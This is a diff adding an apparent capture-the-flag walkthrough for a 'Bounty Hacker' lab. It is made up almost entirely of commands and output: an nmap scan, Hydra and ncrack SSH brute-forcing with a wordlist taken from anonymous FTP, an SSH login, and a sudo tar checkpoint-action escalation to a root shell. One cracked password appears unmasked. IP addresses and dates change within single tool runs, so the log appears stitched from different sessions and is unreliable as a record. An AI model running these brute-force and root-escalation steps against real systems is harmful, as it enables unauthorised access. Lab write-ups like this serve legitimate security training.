@@ -1,0 +1,166 @@
+Bounty hacker
+
+NMAP
+┌──(kali㉿kali)-[~]
+└─$ nmap --open 10.10.57.90
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-29 10:49:45 EDT
+Nmap scan report for 10.10.57.90
+Host is up (0.22s latency).
+Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 14.79 seconds
+
+Hydra
+┌──(kali㉿kali)-[~]
+└─$ hydra -l  lin -P locks.txt 10.10.178.70 ssh
+
+
+hydra -l lin -P locks.txt 10.10.178.70 ssh
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2023-11-29 10:49:43
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
+[DATA] attacking ssh://10.10.178.70:22/
+[22][ssh] host: 10.10.57.69   login: lin   password: Red*******ca**
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2023-11-29 10:49:45
+
+===============================================================
+
+2023-11-29 10:49:45 Finished
+FTP
+┌─(kali㉿kali)-[~]
+└─$ ftp 10.10.178.70
+Connected to 10.10.178.70
+220 (vsFTPd 3.0.3)
+Name (10.10.227.3:kali): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp>
+
+ftp> dir *txt
+229 Entering Extended Passive Mode (|||62479|)
+
+ftp: Can't connect to `10.10.178.70: Connection timed out
+200 EPRT command successful. Consider using EPSV.
+150 Here comes the directory listing.
+-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
+-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
+226 Directory send OK.
+
+ftp> less task.txt
+1.) Protect Vicious.
+2.) Plan for Red Eye pickup on the moon.
+-lin
+
+ftp> less locks.txt
+ ***********
+************
+**********
+**********
+**************
+*******
+**********
+**************
+************
+***********
+***********
+***********
+*******
+**********
+**********
+****************
+***************
+***********
+**********
+
+CREATE WORDLIST
+
+┌──(kali㉿kali)-[~/Downloads/BountyHacker]
+└─$ cat wordlist_pass.txt
+***********
+************
+**********
+**********
+**************
+*******
+**********
+**************
+************
+***********
+***********
+***********
+*******
+**********
+**********
+****************
+***************
+***********
+**********
+
+NCRACK
+┌──(kali㉿kali)-[~/Downloads/BountyHacker]
+└─$ ncrack -v 10.10.178.70--user lin -P wordlist_pass.txt -p ssh
+
+Starting Ncrack 0.7 ( http://ncrack.org ) at 2023-05-27 00:56 EDT
+
+Discovered credentials on ssh://10.10.227.3:22 'lin' 'RedDr4gonSynd1cat3'
+ssh://10.10.227.3:22 finished.
+
+Discovered credentials for ssh on 10.10.178.70 22/tcp:
+10.10.227.3 22/tcp ssh: 'lin' 'RedDr4gonSyn*****'
+
+Ncrack done: 1 service scanned in 24.00 seconds.
+Probes sent: 18 | timed-out: 0 | prematurely-closed: 0
+
+Ncrack finished.
+
+SSH
+┌──(kali㉿kali)-[~]
+└─$ ssh lin@10.10.178.70
+lin@10.10.178.70's password:
+The authenticity of host '10.10.178.70 (10.10.178.70)' can't be established.
+ED25519 key fingerprint is SHA256:Y14 +ukdhfyG8/c5Kv vm+Kl+gLSv ys7SgPU.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:4: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.178.70' (ED25519) to the list of known hosts.
+lin@10.10.178.70's password:
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)
+
+* Documentation:  https://help.ubuntu.com
+* Management:    https://landscape.canonical.com
+* Support:        https://ubuntu.com/advantage
+
+83 packages can be updated.
+0 updates are security updates.
+
+Last login: Sun Jun  7 22:23:41 2020 from 192.168.2.1
+lin@bountyhacker:~/Desktop$ ls -lrt
+total 4
+-rw-rw-r-- 1 lin lin 21 Jun  7  2020 user.txt
+lin@bountyhacker:~/Desktop$ cat user.txt
+THM{C*******}
+
+GTFOBINS
+https://gtfobins.github.io/gtfobins/tar/#shell
+
+TAR
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+[sudo] password for lin:
+tar: Removing leading `/' from member names
+# find / -name root.txt       
+/root/root.txt
+
+find: ‘/run/user/108/gvfs’: Permission denied
+# #
+# cat /root/root.txt
